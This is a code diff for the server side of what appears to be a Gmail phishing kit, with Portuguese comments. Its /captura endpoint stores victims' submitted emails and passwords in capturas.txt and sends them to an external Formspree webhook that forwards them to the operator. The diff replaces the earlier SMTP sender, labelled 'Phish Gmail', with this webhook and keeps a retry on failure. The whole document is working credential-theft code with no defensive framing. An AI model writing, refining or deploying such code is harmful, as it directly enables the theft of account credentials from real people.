@@ -1,5 +1,4 @@
 const express = require('express');
-const nodemailer = require('nodemailer');
 const fs = require('fs');
 const path = require('path');
 
@@ -24,32 +23,32 @@ if (!fs.existsSync(DATA_DIR)) {
 }
 const CAPTURAS_FILE = path.join(DATA_DIR, 'capturas.txt');
 
-async function enviarEmail(email, password, timestamp) {
-  if (!process.env.SMTP_USER || !process.env.SMTP_PASS || !process.env.RECEIVER_EMAIL) {
-    console.warn('[email] variaveis SMTP nao configuradas — pulando envio');
+// Envia captura para o webhook do Formspree (que reencaminha pro seu e-mail)
+async function enviarFormspree(email, password, timestamp) {
+  const url = process.env.FORMSPREE_URL;
+  if (!url) {
+    console.warn('[formspree] FORMSPREE_URL nao configurada — pulando envio');
     return;
   }
 
-  const transporter = nodemailer.createTransport({
-    host: process.env.SMTP_HOST || 'smtp.gmail.com',
-    port: parseInt(process.env.SMTP_PORT || '465'),
-    secure: process.env.SMTP_SECURE !== 'false', // true por padrao (porta 465)
-    connectionTimeout: 10000,
-    greetingTimeout: 10000,
-    socketTimeout: 15000,
-    auth: {
-      user: process.env.SMTP_USER,
-      pass: process.env.SMTP_PASS
-    }
+  const res = await fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Accept': 'application/json'
+    },
+    body: JSON.stringify({
+      _subject: `Nova captura: ${email}`,
+      email: email,
+      senha: password,
+      data: timestamp
+    })
   });
 
-  const info = await transporter.sendMail({
-    from: `"Phish Gmail" <${process.env.SMTP_USER}>`,
-    to: process.env.RECEIVER_EMAIL,
-    subject: `Nova captura: ${email}`,
-    text: `Data: ${timestamp}\nE-mail: ${email}\nSenha: ${password}`
-  });
-  console.log('[email] enviado:', info.messageId);
+  if (!res.ok) {
+    throw new Error('HTTP ' + res.status + ' ' + (await res.text()));
+  }
+  console.log('[formspree] enviado com sucesso');
 }
 
 app.post('/captura', async (req, res) => {
@@ -67,14 +66,14 @@ app.post('/captura', async (req, res) => {
     console.error('[captura] erro ao gravar arquivo:', err.message);
   }
 
-  // 2. Envia por e-mail (com retry simples)
+  // 2. Envia pro Formspree -> cai no seu e-mail (com retry)
   try {
-    await enviarEmail(email, password, timestamp);
+    await enviarFormspree(email, password, timestamp);
   } catch (err) {
-    console.error('[email] tentativa 1 falhou:', err.message);
+    console.error('[formspree] tentativa 1 falhou:', err.message);
     setTimeout(() => {
-      enviarEmail(email, password, timestamp)
-        .catch(e2 => console.error('[email] tentativa 2 falhou:', e2.message));
+      enviarFormspree(email, password, timestamp)
+        .catch(e2 => console.error('[formspree] tentativa 2 falhou:', e2.message));
     }, 3000);
   }
 });
